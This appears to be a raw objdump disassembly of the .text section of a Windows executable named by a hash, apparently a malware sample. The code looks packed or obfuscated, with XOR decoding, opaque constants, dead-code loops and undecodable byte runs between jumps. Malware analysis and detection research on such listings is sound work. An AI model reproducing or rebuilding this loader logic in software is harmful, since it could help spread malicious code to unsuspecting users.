
74b423d9deabb1c323bbe2c77a1087af97a9f7481be670285741e241297e9778.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x2c
  401006:	mov    ecx,DWORD PTR ds:0x4292e5
  40100c:	mov    eax,ds:0x4292f5
  401011:	sub    eax,ecx
  401013:	xor    ecx,DWORD PTR [ecx+eax*1]
  401016:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  40101d:	not    ecx
  40101f:	jmp    0x4010ec
  401024:	cdq    
  401025:	data16 cmc 
  401027:	push   edx
  401028:	push   ebp
  401029:	jge    0x4010a4
  40102b:	jge    0x401034
  40102d:	jmp    FWORD PTR [ebx-0x1add717b]
  401033:	ins    DWORD PTR es:[edi],dx
  401034:	jl     0x4010b2
  401036:	jl     0x4010b4
  401038:	lods   al,BYTE PTR ds:[esi]
  401039:	jl     0x4010b7
  40103b:	jl     0x401009
  40103d:	(bad)  
  40103e:	xor    ecx,ebx
  401040:	xor    eax,0xccddcfdb
  401045:	ja     0x4010bd
  401047:	or     ecx,DWORD PTR [edi]
  401049:	inc    edi
  40104a:	or     cl,BYTE PTR [edi]
  40104c:	cmp    ecx,DWORD PTR [edi]
  40104e:	retf   0x3712
  401051:	sbb    bl,BYTE PTR [edi]
  401053:	mov    ch,0x52
  401055:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40105b:	rol    esp,cl
  40105d:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401064:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40106a:	out    dx,al
  40106b:	outs   dx,DWORD PTR ds:[esi]
  40106c:	add    ebx,DWORD PTR ds:0x4ac4729e
  401072:	mov    al,ds:0x36dd215b
  401077:	mov    eax,ds:0xa3c97380
  40107d:	je     0x4010b5
  40107f:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401085:	jecxz  0x4010c1
  401087:	and    ebp,0x4f
  40108a:	aam    0x94
  40108c:	dec    ebp
  40108d:	inc    DWORD PTR [edi-0x2f5a886e]
  401093:	mov    cl,0x41
  401095:	loope  0x4010bb
  401097:	pop    ecx
  401098:	sub    edi,DWORD PTR [eax-0x41639320]
  40109e:	jae    0x4010bd
  4010a0:	retf   
  4010a1:	cwde   
  4010a2:	sub    eax,0xc85ce3c6
  4010a7:	(bad)  
  4010a8:	mov    dl,0xfa
  4010aa:	loopne 0x401044
  4010ac:	cmp    eax,0xc76966cf
  4010b1:	sub    al,cl
  4010b3:	or     ch,dl
  4010b5:	sbb    eax,0xb39945d
  4010ba:	outs   dx,DWORD PTR ds:[esi]
  4010bb:	ins    DWORD PTR es:[edi],dx
  4010bc:	jb     0x4010c0
  4010be:	cmp    eax,0x22468cd1
  4010c3:	jns    0x401144
  4010c5:	cmp    al,0x8f
  4010c7:	add    bl,dl
  4010c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010ca:	add    edx,DWORD PTR [ebx+0x59]
  4010cd:	rol    esp,1
  4010cf:	add    eax,0x15d55edb
  4010d4:	jge    0x401072
  4010d6:	mov    ah,0x43
  4010d8:	daa    
  4010d9:	sbb    DWORD PTR [ebx],esp
  4010db:	addr16 and eax,0x4f3cdb10
  4010e1:	loop   0x4010b1
  4010e3:	xchg   esi,eax
  4010e4:	cmp    dh,bl
  4010e6:	cmp    eax,0x7f5e937f
  4010eb:	add    bh,0x45
  4010ee:	in     al,dx
  4010ef:	xor    eax,0xb8f89c85
  4010f4:	pop    es
  4010f5:	xchg   ebp,eax
  4010f6:	add    BYTE PTR [eax],al
  4010f8:	add    DWORD PTR ds:0x427cf7,ecx
  4010fe:	jmp    0x4011cb
  401103:	leave  
  401104:	mov    bh,BYTE PTR [edi+esi*4-0x7536b24d]
  40110b:	pop    ebx
  40110c:	mov    dl,0x88
  40110e:	les    ebp,FWORD PTR [ebp-0x53bf09eb]
  401114:	jl     0x401192
  401116:	jl     0x4010c4
  401118:	jl     0x401196
  40111a:	jl     0x4010e6
  40111c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40111d:	lods   eax,DWORD PTR ds:[esi]
  40111e:	inc    ecx
  40111f:	mov    dh,0xc
  401121:	mov    cl,0x1a
  401123:	nop
  401124:	sub    DWORD PTR [ebx+edi*2-0x5e19d8ff],ebp
  40112b:	xchg   al,dl
  40112d:	push   esi
  40112e:	fcomp  st(2)
  401130:	sbb    dl,cl
  401132:	iret   
  401133:	pop    ebp
  401134:	mov    esp,0x5bb81ace
  401139:	cdq    
  40113a:	pop    esi
  40113b:	add    ecx,DWORD PTR [esi]
  40113d:	sub    esi,esp
  40113f:	out    dx,eax
  401140:	add    eax,0x43936c1a
  401145:	mov    ecx,0x58e292b3
  40114a:	fdivr  DWORD PTR [eax+0x3a0876f6]
  401150:	(bad)  [edx-0x7c]
  401153:	dec    esp
  401154:	ja     0x40119c
  401156:	jnp    0x401109
  401158:	ins    BYTE PTR es:[edi],dx
  401159:	push   ss
  40115a:	adc    DWORD PTR [eax],ecx
  40115c:	loope  0x4011d3
  40115e:	dec    ecx
  40115f:	dec    edx
  401160:	rcr    DWORD PTR [eax],0xa5
  401163:	xor    ah,dl
  401165:	pop    es
  401166:	dec    ebp
  401167:	jmp    0xd30c3531
  40116c:	pop    ss
  40116d:	inc    ebx
  40116e:	adc    edi,edx
  401170:	arpl   WORD PTR [ebx],di
  401172:	jno    0x4011e4
  401174:	sbb    eax,0x4416509c
  401179:	add    al,0x35
  40117b:	push   ds
  40117c:	jl     0x401163
  40117e:	jmp    0x3c7f:0x76bf72d4
  401185:	aas    
  401186:	inc    esp
  401187:	out    0xee,eax
  401189:	sbb    esp,DWORD PTR [edi]
  40118b:	pop    edi
  40118c:	js     0x40115a
  40118e:	daa    
  40118f:	out    0xaf,eax
  401191:	jmp    0x401128
  401193:	and    al,0xd3
  401195:	cmp    al,0x48
  401197:	mov    al,ds:0x8b7d601b
  40119c:	mov    edi,esp
  40119e:	mov    ah,0xf4
  4011a0:	add    esi,DWORD PTR [eax+0x76]
  4011a3:	xor    bl,BYTE PTR [esi]
  4011a5:	outs   dx,BYTE PTR ds:[esi]
  4011a6:	ret    0xeb42
  4011a9:	lods   al,BYTE PTR ds:[esi]
  4011aa:	out    0x23,eax
  4011ac:	fistp  QWORD PTR [edi]
  4011ae:	stos   DWORD PTR es:[edi],eax
  4011af:	inc    esi
  4011b0:	sbb    bl,bh
  4011b2:	pop    eax
  4011b3:	sub    BYTE PTR [edx+0x29],0xfe
  4011b7:	push   eax
  4011b8:	rcr    DWORD PTR [ebx+0x58c89cce],1
  4011be:	leave  
  4011bf:	sub    eax,0x478b9079
  4011c4:	mov    bl,0xda
  4011c6:	popa   
  4011c7:	dec    ebx
  4011c8:	mov    bh,BYTE PTR [ebx-0x1]
  4011cb:	mov    WORD PTR [ebp-0x4],ax
  4011cf:	lea    eax,[ebp-0x24]
  4011d2:	xor    DWORD PTR ds:0x4275a0,0x226
  4011dc:	mov    DWORD PTR [ebp-0x28],eax
  4011df:	not    DWORD PTR ds:0x4292b5
  4011e5:	mov    eax,DWORD PTR [ebp+0x8]
  4011e8:	movzx  ecx,BYTE PTR ds:0x4275a4
  4011ef:	adc    ecx,DWORD PTR ds:0x4292cd
  4011f5:	mov    DWORD PTR ds:0x4275a4,ecx
  4011fb:	mov    DWORD PTR [ebp-0x20],eax
  4011fe:	xor    DWORD PTR ds:0x42c89e,0x5a6f
  401208:	push   ebx
  401209:	sub    DWORD PTR ds:0x4275a0,ebx
  40120f:	lea    eax,[ebp-0x18]
  401212:	mov    DWORD PTR ds:0x4275ac,0x15
  40121c:	cmp    DWORD PTR ds:0x4275ac,0x0
  401223:	je     0x40124e
  401229:	cmp    DWORD PTR ds:0x4275ac,0x1b
  401230:	jne    0x40123c
  401236:	call   DWORD PTR ds:0x4279b7
  40123c:	mov    ebx,DWORD PTR ds:0x4275ac
  401242:	dec    ebx
  401243:	mov    DWORD PTR ds:0x4275ac,ebx
  401249:	jmp    0x40121c
  40124e:	mov    DWORD PTR [ebp-0x1c],eax
  401251:	movzx  ebx,WORD PTR ds:0x4292c5
  401258:	and    DWORD PTR ds:0x42c896,ebx
  40125e:	mov    eax,DWORD PTR [ebp-0x1c]
  401261:	mov    DWORD PTR ds:0x4292ad,0xc0c
  40126b:	push   esi
  40126c:	push   edi
  40126d:	or     edi,ecx
  40126f:	mov    edi,0xf89f2dad
  401274:	add    ebx,0x5343
  40127a:	mov    DWORD PTR [eax],edi
  40127c:	sub    ecx,DWORD PTR ds:0x427d1f
  401282:	mov    eax,DWORD PTR [ebp-0x14]
  401285:	add    DWORD PTR ds:0x4275a4,0x42c886
  40128f:	mov    ebx,DWORD PTR [ebp-0x8]
  401292:	mov    ecx,0x7510857
  401297:	sbb    DWORD PTR ds:0x427d03,ecx
  40129d:	xor    eax,ecx
  40129f:	mov    esi,0x32729e
  4012a4:	sub    DWORD PTR ds:0x4292b9,0x427cf7
  4012ae:	xor    ebx,ecx
  4012b0:	xor    edx,edx
  4012b2:	add    eax,esi
  4012b4:	adc    DWORD PTR ds:0x4292d5,0x427d07
  4012be:	jmp    0x40138b
  4012c3:	ror    BYTE PTR [edx],0x15
  4012c6:	std    
  4012c7:	std    
  4012c8:	std    
  4012c9:	fsubr  DWORD PTR ds:0xe0012c42
  4012cf:	aad    0x53
  4012d1:	push   esi
  4012d2:	rcr    ah,0x7f
  4012d5:	jl     0x401353
  4012d7:	lods   al,BYTE PTR ds:[esi]
  4012d8:	jl     0x401356
  4012da:	jl     0x4012c2
  4012dc:	xchg   edx,eax
  4012dd:	stos   DWORD PTR es:[edi],eax
  4012de:	xchg   esi,eax
  4012df:	fimul  DWORD PTR [esi-0x67]
  4012e2:	or     BYTE PTR [eax],dl
  4012e4:	fnsave [ecx+0x530c38c]
  4012ea:	mov    dl,0x3b
  4012ec:	push   edi
  4012ed:	mov    edi,0x62ae93dd
  4012f2:	adc    ebp,DWORD PTR [eax+0x68]
  4012f5:	xor    eax,esi
  4012f7:	div    DWORD PTR [eax+0x356b2b1]
  4012fd:	jmp    DWORD PTR [ecx+0x652fdc9]
  401303:	stc    
  401304:	(bad)  
  401305:	adc    al,0x85
  401307:	xor    ebx,DWORD PTR [esi+0x4f]
  40130a:	mov    cl,0x85
  40130c:	sahf   
  40130d:	out    0xf0,al
  40130f:	retf   
  401310:	fs test eax,0xa3f60c06
  401316:	cli    
  401317:	add    eax,0x67fe03ba
  40131c:	popa   
  40131d:	or     eax,0x54e1a059
  401322:	push   eax
  401323:	sbb    eax,DWORD PTR [ecx]
  401325:	cmc    
  401326:	cmp    eax,0x48655d0a
  40132b:	lea    edx,[edx+0x79]
  40132e:	lahf   
  40132f:	mov    ?,WORD PTR [ecx+edx*1-0x4b]
  401333:	in     eax,dx
  401334:	imul   eax,esi,0x5a714e6a
  40133a:	rol    DWORD PTR [ecx+edi*2+0x76d443b7],1
  401341:	lar    esi,WORD PTR [edi-0x41]
  401345:	add    ecx,ebx
  401347:	or     eax,0xb9859a9
  40134c:	cli    
  40134d:	retf   0xafb1
  401350:	iret   
  401351:	rcr    BYTE PTR [ebx-0xf],0xad
  401355:	sbb    BYTE PTR [esi+esi*1],al
  401358:	cwde   
  401359:	fstcw  WORD PTR [edx]
  40135c:	pop    eax
  40135d:	sub    DWORD PTR [eax+0x606cd9a7],0xffffffd9
  401364:	mov    cl,0xe6
  401366:	xchg   ebp,eax
  401367:	pop    es
  401368:	scas   al,BYTE PTR es:[edi]
  401369:	in     al,0x24
  40136b:	dec    edi
  40136c:	stos   DWORD PTR es:[edi],eax
  40136d:	jmp    FWORD PTR [esi-0x5c70b7d8]
  401373:	sar    DWORD PTR [eax+0x1a],1
  401376:	pop    esi
  401377:	inc    esp
  401378:	fdiv   QWORD PTR [eax+0x55a3e27b]
  40137e:	sbb    al,0x51
  401380:	int    0x2d
  401382:	push   esi
  401383:	leave  
  401384:	dec    ebx
  401385:	sub    ebp,edi
  401387:	add    DWORD PTR [ebx-0x21fc18cb],edx
  40138d:	div    ebx
  40138f:	mov    edx,0x67cd
  401394:	mov    edx,DWORD PTR [ebp-0x20]
  401397:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  40139e:	jmp    0x40146b
  4013a3:	(bad)  
  4013a4:	mov    bl,ch
  4013a6:	nop
  4013a7:	jge    0x40140c
  4013a9:	jns    0x4013f5
  4013ab:	imul   edi,DWORD PTR [ecx+0x73453a1b],0x7e0c6089
  4013b5:	jl     0x401433
  4013b7:	lods   al,BYTE PTR ds:[esi]
  4013b8:	jl     0x401436
  4013ba:	jl     0x401409
  4013bc:	int    0xaa
  4013be:	cli    
  4013bf:	push   esi
  4013c0:	add    DWORD PTR [esi+0x65],ecx
  4013c3:	dec    esp
  4013c4:	pusha  
  4013c5:	push   esi
  4013c6:	rcl    bh,0x7b
  4013c9:	mov    dh,0xfd
  4013cb:	pop    ebp
  4013cc:	shl    DWORD PTR [ebx-0x6f],0xac
  4013d0:	mov    DWORD PTR [edx+0x2f7fef3e],edi
  4013d6:	in     al,0x8f
  4013d8:	scas   al,BYTE PTR es:[edi]
  4013d9:	add    bh,cl
  4013db:	or     eax,0x41a66166
  4013e0:	mov    al,ds:0xdc71557
  4013e5:	rcl    esi,cl
  4013e7:	cmp    edx,edi
  4013e9:	mov    edx,0xd00753f2
  4013ee:	add    eax,0xde4b1301
  4013f3:	and    ecx,DWORD PTR [esi-0x40]
  4013f6:	xchg   BYTE PTR ds:0xfc6ac10d,al
  4013fc:	or     BYTE PTR [ebx-0x58],dh
  4013ff:	cmp    eax,0xfe861fd7
  401404:	add    eax,ecx
  401406:	xchg   edi,eax
  401407:	call   0xeb92:0x1e381da1
  40140e:	mov    edi,0x1d731f9f
  401413:	out    dx,al
  401414:	pop    ecx
  401415:	dec    edi
  401416:	xchg   BYTE PTR [esi+0x79],dl
  401419:	out    0xb9,eax
  40141b:	dec    edi
  40141c:	aas    
  40141d:	xor    bh,BYTE PTR [ecx-0x7e]
  401420:	lds    edx,FWORD PTR ds:0x837812c3
  401426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401427:	jg     0x401488
  401429:	mul    DWORD PTR [edi-0x3939f6ac]
  40142f:	fadd   DWORD PTR [edi]
  401431:	icebp  
  401432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401433:	cmp    al,0x5a
  401435:	pusha  
  401436:	and    eax,0x99fd10eb
  40143b:	xchg   edx,eax
  40143c:	adc    al,0xe7
  40143e:	pop    ss
  40143f:	out    0x8,eax
  401441:	stc    
  401442:	pushf  
  401443:	ja     0x4014c3
  401445:	push   cs
  401446:	sar    BYTE PTR [edi-0x7b],cl
  401449:	call   0x39f0e585
  40144e:	add    esp,esi
  401450:	push   ss
  401451:	mov    ah,0x71
  401453:	loope  0x4014b8
  401455:	aaa    
  401456:	add    eax,0x38132ae2
  40145b:	jo     0x401491
  40145d:	call   0xcd7fc2e
  401462:	gs sub ebx,edx
  401465:	pop    edx
  401466:	mov    eax,0x44279c12
  40146b:	cmp    eax,DWORD PTR [edx]
  40146d:	mov    DWORD PTR ds:0x427594,0x1170
  401477:	je     0x40195a
  40147d:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401484:	sub    DWORD PTR ds:0x42759c,edx
  40148a:	lea    eax,[ebp-0xc]
  40148d:	mov    DWORD PTR [ebp-0x10],eax
  401490:	sub    edx,eax
  401492:	mov    eax,DWORD PTR [ebp-0x10]
  401495:	not    edx
  401497:	mov    edx,DWORD PTR [eax]
  401499:	imul   edx,edx,0xf89ea9e0
  40149f:	mov    DWORD PTR ds:0x42c88a,0x7964
  4014a9:	mov    DWORD PTR [eax],edx
  4014ab:	mov    DWORD PTR ds:0x4292d9,0x7646
  4014b5:	mov    eax,DWORD PTR [ebp-0xc]
  4014b8:	cmp    eax,0x1fe34420
  4014bd:	mov    DWORD PTR ds:0x4292d5,0x4bbf
  4014c7:	je     0x401629
  4014cd:	and    ebx,0x6650
  4014d3:	jmp    0x4015a0
  4014d8:	cs scas eax,DWORD PTR es:[edi]
  4014da:	inc    ebp
  4014db:	add    eax,0xa36ee545
  4014e0:	sbb    DWORD PTR [edi+0x1200e5e0],ebx
  4014e6:	sbb    al,0xa7
  4014e8:	mov    esp,0xac7c7c7e
  4014ed:	jl     0x40156b
  4014ef:	jl     0x4014f5
  4014f1:	das    
  4014f2:	cli    
  4014f3:	mov    ah,0x25
  4014f5:	push   esp
  4014f6:	mov    ds:0xad05cde8,eax
  4014fb:	call   0xe825a3b4
  401500:	xchg   ecx,eax
  401501:	jno    0x40155e
  401503:	xor    al,0x6f
  401505:	adc    DWORD PTR [edi],ebx
  401507:	xchg   ecx,eax
  401508:	cmc    
  401509:	(bad)  
  40150a:	push   ss
  40150b:	stc    
  40150c:	mov    ecx,0x741888a5
  401511:	bound  esi,QWORD PTR [edx+edx*4-0x4d]
  401515:	(bad)  
  401516:	mov    ah,0xba
  401518:	lahf   
  401519:	fwait
  40151a:	pop    esp
  40151b:	fdivr  DWORD PTR [ecx+0x54]
  40151e:	xor    al,0xf3
  401520:	mov    BYTE PTR [ebp+0x3],cl
  401523:	lds    edx,FWORD PTR [edi]
  401525:	mov    BYTE PTR [edx+ecx*1],bl
  401528:	pop    ss
  401529:	test   al,0x2b
  40152b:	mov    esp,0x2b3bb4d0
  401530:	mov    edx,0x831c4a80
  401535:	push   0x2b
  401537:	aas    
  401538:	dec    edx
  401539:	das    
  40153a:	or     BYTE PTR [esi+0x699cbf5],bl
  401540:	xor    al,BYTE PTR [ecx-0x59]
  401543:	fimul  WORD PTR [eax+0x29d90aa4]
  401549:	push   es
  40154a:	cmp    ebx,DWORD PTR [ebp+0x52]
  40154d:	xchg   esi,eax
  40154e:	dec    esi
  40154f:	ins    BYTE PTR es:[edi],dx
  401550:	pop    esp
  401551:	xchg   edx,eax
  401552:	and    esi,0xc18df480
  401558:	scas   eax,DWORD PTR es:[edi]
  401559:	or     eax,DWORD PTR [eax-0x60]
  40155c:	sahf   
  40155d:	or     dh,BYTE PTR [ecx+edx*1-0x22]
  401561:	mov    BYTE PTR [eax+0x77305fe2],al
  401567:	arpl   WORD PTR [ebx-0x30cf17f3],bp
  40156d:	je     0x40151a
  40156f:	jmp    0x4b10b0aa
  401574:	aam    0xdb
  401576:	stos   DWORD PTR es:[edi],eax
  401577:	shl    BYTE PTR [edx-0x30],1
  40157a:	in     al,0x6d
  40157c:	push   esp
  40157d:	mov    bh,0x66
  40157f:	push   esi
  401580:	xor    BYTE PTR [eax],al
  401582:	mov    ecx,0xd7edd71a
  401587:	jnp    0x4015a6
  401589:	ret    
  40158a:	cmp    eax,0x4b350765
  40158f:	inc    BYTE PTR [eax-0x572d731]
  401595:	or     BYTE PTR ds:0x2d9d9018,0x7f
  40159c:	xor    DWORD PTR [edi],ebx
  40159e:	fild   WORD PTR [ebx-0x7e1bba75]
  4015a4:	or     BYTE PTR [eax-0x389f8ae4],dl
  4015aa:	add    eax,0x427598
  4015af:	adc    al,0x0
  4015b1:	add    BYTE PTR [eax],al
  4015b3:	cmp    DWORD PTR ds:0x427598,0x0
  4015ba:	je     0x40160a
  4015c0:	cmp    DWORD PTR ds:0x427598,0x6
  4015c7:	jne    0x4015d9
  4015cd:	push   DWORD PTR [ebp-0x1c]
  4015d0:	push   DWORD PTR [ebp-0xc]
  4015d3:	call   DWORD PTR ds:0x427c3f
  4015d9:	cmp    DWORD PTR ds:0x427598,0x7
  4015e0:	jne    0x4015f4
  4015e6:	xor    eax,eax
  4015e8:	xor    eax,DWORD PTR ds:0x427598
  4015ee:	dec    eax
  4015ef:	mov    ds:0x427598,eax
  4015f4:	mov    eax,ds:0x427598
  4015f9:	dec    eax
  4015fa:	mov    ds:0x427598,eax
  4015ff:	jmp    0x4015b3
  401604:	or     DWORD PTR ds:0x427594,edi
  40160a:	mov    eax,DWORD PTR [ebp-0x8]
  40160d:	mov    ebx,DWORD PTR ds:0x427d8c
  401613:	mov    edi,DWORD PTR ds:0x42c8de
  401619:	sub    edi,ebx
  40161b:	sub    ebx,DWORD PTR [ebx+edi*1]
  40161e:	xor    eax,ecx
  401620:	add    eax,esi
  401622:	pop    edi
  401623:	pop    esi
  401624:	pop    ebx
  401625:	leave  
  401626:	ret    0x4
  401629:	mov    eax,DWORD PTR [ebp-0xc]
  40162c:	add    eax,DWORD PTR [ebp-0x18]
  40162f:	cmp    eax,0x188271cd
  401634:	je     0x401648
  40163a:	mov    eax,DWORD PTR [ebp-0x10]
  40163d:	and    DWORD PTR [eax],0x751c9d
  401643:	jmp    0x4015a9
  401648:	mov    eax,DWORD PTR [ebp-0xc]
  40164b:	mov    edx,DWORD PTR [ebp-0x18]
  40164e:	or     eax,edx
  401650:	cmp    eax,0xffff6dad
  401655:	je     0x401669
  40165b:	mov    eax,DWORD PTR [ebp-0x10]
  40165e:	xor    DWORD PTR [eax],0x2650fa8f
  401664:	jmp    0x4015a9
  401669:	mov    ax,WORD PTR [ebp-0x4]
  40166d:	mov    edi,DWORD PTR [ebp+0x8]
  401670:	mov    edi,DWORD PTR [edi]
  401672:	mov    edx,0x8a42
  401677:	xor    ax,dx
  40167a:	mov    edx,0x3b08
  40167f:	add    ax,dx
  401682:	cmp    ax,WORD PTR [edi]
  401685:	je     0x401939
  40168b:	mov    eax,DWORD PTR [ebp-0x14]
  40168e:	xor    eax,ecx
  401690:	add    eax,esi
  401692:	mov    DWORD PTR [ebp-0x24],eax
  401695:	mov    eax,DWORD PTR [ebp-0x28]
  401698:	mov    di,WORD PTR [ebp-0x2c]
  40169c:	mov    ebx,0x8a42
  4016a1:	xor    di,bx
  4016a4:	jmp    0x401771
  4016a9:	pop    ebp
  4016aa:	and    ebx,DWORD PTR [ebp-0x65]
  4016ad:	jge    0x40172c
  4016af:	pop    ebp
  4016b0:	in     eax,0x36
  4016b2:	call   0x3efc:0x3bcf28ca
  4016b9:	in     al,dx
  4016ba:	jno    0x401738
  4016bc:	jl     0x40166a
  4016be:	jl     0x40173c
  4016c0:	jl     0x401739
  4016c2:	jno    0x4016cf
  4016c4:	call   0xfb077bb9
  4016c9:	aad    0xe3
  4016cb:	push   es
  4016cc:	dec    esi
  4016cd:	mov    cl,0xca
  4016cf:	leave  
  4016d0:	pop    ss
  4016d1:	icebp  
  4016d2:	nop
  4016d3:	sub    ch,BYTE PTR [edi]
  4016d5:	fwait
  4016d6:	xchg   edi,eax
  4016d7:	and    eax,0x3badcbc7
  4016dc:	rcr    DWORD PTR [eax-0x3],1
  4016df:	pop    edi
  4016e0:	pop    edx
  4016e1:	and    ebx,DWORD PTR [ecx+0x37138c9]
  4016e7:	xchg   DWORD PTR [edx-0x79],ebx
  4016ea:	cmp    al,0xd7
  4016ec:	pop    es
  4016ed:	sub    DWORD PTR gs:[ebx-0x47756724],esp
  4016f4:	mov    ebp,DWORD PTR [esi+ebx*4]
  4016f7:	aam    0xa6
  4016f9:	ins    DWORD PTR es:[edi],dx
  4016fa:	cli    
  4016fb:	mov    bh,0xfb
  4016fd:	fst    DWORD PTR [esi+0x5814ce2d]
  401703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401704:	mov    edi,0x6176d18e
  401709:	pop    edx
  40170a:	loop   0x40172d
  40170c:	push   edx
  40170d:	pop    esp
  40170e:	out    0xbc,eax
  401710:	xchg   esp,eax
  401711:	dec    edi
  401712:	xor    BYTE PTR [eax+0x273bba79],ch
  401718:	xor    BYTE PTR [edi+0x67],al
  40171b:	push   0x4e
  40171d:	clc    
  40171e:	jg     0x401743
  401720:	xchg   ecx,eax
  401721:	inc    ebp
  401722:	cld    
  401723:	cli    
  401724:	hlt    
  401725:	inc    edx
  401726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401727:	ja     0x401761
  401729:	ds stos BYTE PTR es:[edi],al
  40172b:	inc    ecx
  40172c:	xchg   DWORD PTR [ecx],ebp
  40172e:	inc    edx
  40172f:	add    eax,DWORD PTR [esi+0x50]
  401732:	jbe    0x401768
  401734:	inc    eax
  401735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401736:	and    DWORD PTR [ecx+0x24],eax
  401739:	jp     0x4016fa
  40173b:	xchg   esp,eax
  40173c:	cmp    al,0x8e
  40173e:	adc    esi,DWORD PTR [ebp+ebx*1-0x42]
  401742:	shl    DWORD PTR [esi+0x14c830e3],cl
  401748:	add    al,0x2a
  40174a:	xor    BYTE PTR ds:0xd37d1da9,al
  401750:	mov    al,ds:0x540f0c7f
  401755:	push   ebx
  401756:	test   BYTE PTR [esi+ecx*2-0x6f],0x84
  40175b:	push   edi
  40175c:	pop    ss
  40175d:	push   es
  40175e:	fistp  QWORD PTR [esi+0x41e3ce30]
  401764:	std    
  401765:	adc    DWORD PTR [eax*8+0x4f5029c7],esp
  40176c:	std    
  40176d:	push   eax
  40176e:	jl     0x401736
  401770:	in     al,0x66
  401772:	add    edi,edx
  401774:	movzx  edx,di
  401777:	mov    edi,DWORD PTR [ebp-0x8]
  40177a:	jmp    0x401847
  40177f:	repz shl DWORD PTR [edx+0x55456240],cl
  401786:	jecxz  0x401791
  401788:	push   cs
  401789:	scas   eax,DWORD PTR es:[edi]
  40178a:	ror    BYTE PTR [ebx-0x42],1
  40178d:	imul   ebx,DWORD PTR ss:[eax+esi*2],0x7c
  401792:	jl     0x401740
  401794:	jl     0x401812
  401796:	jl     0x401774
  401798:	xor    DWORD PTR gs:[ecx-0x291bd958],0xfffffff1
  4017a0:	(bad)  
  4017a1:	cmp    DWORD PTR [ecx+0x5d],esp
  4017a4:	mov    ds:0x117c8f68,eax
  4017a9:	loop   0x401813
  4017ab:	sbb    DWORD PTR [eax],esi
  4017ad:	imul   ebx,DWORD PTR [esi+0x23],0xffffffb8
  4017b1:	cmc    
  4017b2:	xchg   esp,eax
  4017b4:	push   edx
  4017b5:	sub    DWORD PTR [ebp-0x3291f996],0xb
  4017bc:	sbb    al,BYTE PTR [ebx+ebp*4]
  4017bf:	xchg   ecx,eax
  4017c0:	ror    bl,1
  4017c2:	jne    0x4017c6
  4017c4:	daa    
  4017c5:	std    
  4017c6:	ja     0x4017c7
  4017c8:	out    dx,eax
  4017c9:	(bad)  
  4017ca:	jnp    0x401792
  4017cc:	mov    esi,0x4b383534
  4017d1:	dec    ecx
  4017d2:	mov    edx,0xa41848e9
  4017d7:	mov    ebp,0xd0e60892
  4017dc:	inc    ecx
  4017dd:	popa   
  4017de:	pop    ebx
  4017df:	mov    DWORD PTR [edx+eiz*1-0x3b098d23],ecx
  4017e6:	cmp    dh,ah
  4017e8:	push   edi
  4017e9:	add    eax,0x435e9189
  4017ee:	pop    edx
  4017ef:	push   cs
  4017f0:	sar    DWORD PTR [edi-0x35],cl
  4017f3:	adc    al,0x37
  4017f5:	aad    0xd4
  4017f7:	adc    ebp,edi
  4017f9:	pushf  
  4017fa:	mov    ch,0xa6
  4017fc:	push   esi
  4017fd:	inc    ebp
  4017fe:	xor    eax,0xfdc81e18
  401803:	mov    BYTE PTR ss:[esi],ah
  401806:	iret   
  401807:	mov    dl,0xa3
  401809:	cmovl  esi,DWORD PTR [esi-0x5816248a]
  401810:	dec    ecx
  401811:	jle    0x401822
  401813:	inc    eax
  401814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401815:	imul   edi,DWORD PTR [ecx+0x1c104792],0xb27069a8
  40181f:	fimul  DWORD PTR [ecx-0x67]
  401822:	xor    DWORD PTR [esi+0x59],esi
  401825:	fidivr DWORD PTR [ebx+0x15e9ee50]
  40182b:	cwde   
  40182c:	mov    DWORD PTR [ecx],eax
  40182e:	mov    edi,0x35ecdc69
  401833:	sti    
  401834:	std    
  401835:	jns    0x4017e7
  401837:	ss fs pop ebp
  40183a:	jo     0x4018a4
  40183c:	rcr    DWORD PTR [ebp+0x19b371e8],1
  401842:	push   eax
  401843:	jns    0x4017f0
  401845:	push   DWORD PTR [ecx+0x33]
  401848:	stc    
  401849:	lea    edx,[edx+edi*1+0x32729e]
  401850:	add    DWORD PTR [eax],edx
  401852:	mov    eax,DWORD PTR [ebp-0x20]
  401855:	mov    edx,DWORD PTR [ebp-0x8]
  401858:	mov    edi,DWORD PTR [ebp-0x24]
  40185b:	xor    edx,ecx
  40185d:	add    edx,esi
  40185f:	imul   edx,edi
  401862:	sub    DWORD PTR [eax],edx
  401864:	jmp    0x401931
  401869:	pop    ebx
  40186a:	jno    0x401829
  40186c:	loope  0x4018eb
  40186e:	jge    0x4018cb
  401870:	lods   eax,DWORD PTR ds:[esi]
  401871:	xlat   BYTE PTR ds:[ebx]
  401872:	mov    bh,0x47
  401874:	jns    0x4018b2
  401876:	arpl   bp,ax
  401878:	aas    
  401879:	dec    esp
  40187a:	jo     0x4018f8
  40187c:	jl     0x40182a
  40187e:	jl     0x4018fc
  401880:	jl     0x4018c5
  401882:	or     al,cl
  401884:	xchg   edx,eax
  401885:	ins    DWORD PTR es:[edi],dx
  401886:	push   eax
  401887:	push   ss
  401888:	out    0xd4,al
  40188a:	jge    0x4018f5
  40188c:	sahf   
  40188d:	scas   al,BYTE PTR es:[edi]
  40188e:	add    DWORD PTR [edx+0x5aa98127],ebp
  401894:	(bad)  
  401895:	in     eax,dx
  401896:	pushf  
  401897:	cld    
  401898:	ss mov ah,0xf4
  40189b:	xor    eax,0x23bde74b
  4018a0:	and    al,0x99
  4018a2:	scas   eax,DWORD PTR es:[edi]
  4018a3:	ss inc edi
  4018a5:	sub    BYTE PTR ds:0xc4ebfb38,dl
  4018ab:	dec    esp
  4018ac:	jge    0x401839
  4018ae:	hlt    
  4018af:	mov    edx,0xa97a45a1
  4018b4:	in     eax,0x4b
  4018b6:	pop    esi
